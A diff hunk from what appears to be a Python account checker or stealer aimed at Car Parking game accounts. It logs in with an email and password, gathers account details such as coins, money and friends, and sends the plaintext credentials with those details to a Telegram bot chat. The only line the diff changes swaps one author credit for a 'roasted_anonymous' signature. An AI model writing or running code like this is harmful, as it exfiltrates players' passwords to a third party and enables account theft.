@@ -108,7 +108,7 @@ def login(email,password):
         try:Money = result_account['money']
         except:Money = 'None'
         Date_Account = str(datetime.datetime.fromtimestamp(int(deta) / 1000)).split(' ')[0].replace('-', '/')
-        msg_text = f'''*~ Car Parking 🚘*\n*———————————*\n*Email : *`{email}`\n*Password : *`{password}`\n*——*\n*Name : {Player_name} 👤*\n*Coins : {Coins} 🪙*\n*Money : {Money} 💰*\n*Friends : {Friends_count} 👥*\n*Date : {Date_Account} ⌛️*\n*———————————*\n*By @Lê Quyền Ngự *'''
+        msg_text = f'''*~ Car Parking 🚘*\n*———————————*\n*Email : *`{email}`\n*Password : *`{password}`\n*——*\n*Name : {Player_name} 👤*\n*Coins : {Coins} 🪙*\n*Money : {Money} 💰*\n*Friends : {Friends_count} 👥*\n*Date : {Date_Account} ⌛️*\n*———————————*\n*《 ༺ 𝐫𝐨𝐚𝐬𝐭𝐞𝐝_𝐚𝐧𝐨𝐧𝐲𝐦𝐨𝐮𝐬 ༻ 》*'''
         try:
             url = (f'https://api.telegram.org/bot{token}/sendMessage')
             payload = {'chat_id': str(ID), 'text': msg_text, 'parse_mode': 'markdown'}
